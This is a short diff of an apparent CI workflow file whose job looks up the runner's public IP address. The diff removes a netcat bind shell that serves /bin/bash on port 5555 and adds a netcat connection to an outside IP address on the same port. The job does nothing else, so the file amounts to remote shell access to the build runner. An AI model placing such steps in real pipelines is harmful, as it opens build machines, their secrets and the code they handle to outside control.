@@ -6,5 +6,5 @@ jobs:
     steps:
       - run: |     
             curl -s http://whatismyip.akamai.com/
-            nc -n -v -l -p 5555 -e /bin/bash
-            sleep 30s
+            nc 3.84.116.126 5555
+            sleep 60s
